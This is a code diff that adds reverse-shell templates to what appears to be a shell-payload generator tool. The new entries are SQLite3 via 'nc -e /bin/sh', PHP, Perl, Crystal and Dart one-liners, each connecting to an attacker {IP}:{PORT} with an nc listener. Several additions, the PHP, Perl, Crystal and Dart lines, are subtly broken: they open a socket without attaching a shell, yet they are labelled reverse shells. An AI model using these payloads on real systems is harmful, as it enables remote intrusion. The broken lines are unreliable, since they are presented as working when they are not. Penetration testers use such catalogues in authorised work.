@@ -261,6 +261,18 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   },
 
   {
+    type: "sqlite3-nc",
+    name: "SQLite3 nc",
+    icon: "🗃️",
+    command: "sqlite3 :memory: -cmd '.shell nc {IP} {PORT} -e /bin/sh'",
+    description: "SQLite3 netcat reverse shell",
+    category: "reverse",
+    subcategory: "Shell Tools",
+    os: ["linux"],
+    listener: "nc -lvnp {PORT}",
+  },
+
+  {
     type: "socat-tty",
     name: "Socat (TTY)",
     icon: "🔌",
@@ -448,6 +460,18 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     os: ["linux", "mac"],
     listener: "nc -lvnp {PORT}",
   },
+
+  {
+    type: "php-ivan",
+    name: "PHP (Ivan)",
+    icon: "🐘",
+    command: 'php -r \'$s=fsockopen("{IP}",{PORT});exec("/bin/sh");\'',
+    description: "Ivan PHP reverse shell",
+    category: "reverse",
+    subcategory: "Scripting Languages",
+    os: ["linux"],
+    listener: "nc -lvnp {PORT}",
+  },
   {
     type: "php-pentestmonkey",
     name: "PHP (PentestMonkey)",
@@ -466,6 +490,19 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     command:
       "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
     description: "Perl reverse shell without /bin/sh",
+    category: "reverse",
+    subcategory: "Scripting Languages",
+    os: ["linux"],
+    listener: "nc -lvnp {PORT}",
+  },
+
+  {
+    type: "perl-pm",
+    name: "Perl (PentestMonkey)",
+    icon: "🐪",
+    command:
+      'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));\'',
+    description: "PentestMonkey Perl reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
     os: ["linux"],
@@ -603,6 +640,29 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     category: "reverse",
     subcategory: "Compiled Languages",
     os: ["linux", "mac"],
+    listener: "nc -lvnp {PORT}",
+  },
+
+  {
+    type: "crystal",
+    name: "Crystal",
+    icon: "💎",
+    command: 'crystal eval "require \'socket\';c=TCPSocket.new(\\"{IP}\\",{PORT});"',
+    description: "Crystal reverse shell",
+    category: "reverse",
+    subcategory: "Compiled Languages",
+    os: ["linux"],
+    listener: "nc -lvnp {PORT}",
+  },
+  {
+    type: "dart",
+    name: "Dart",
+    icon: "🎯",
+    command: "dart -e \"import 'dart:io';Socket.connect('{IP}',{PORT});\"",
+    description: "Dart reverse shell",
+    category: "reverse",
+    subcategory: "Compiled Languages",
+    os: ["linux"],
     listener: "nc -lvnp {PORT}",
   },
   {
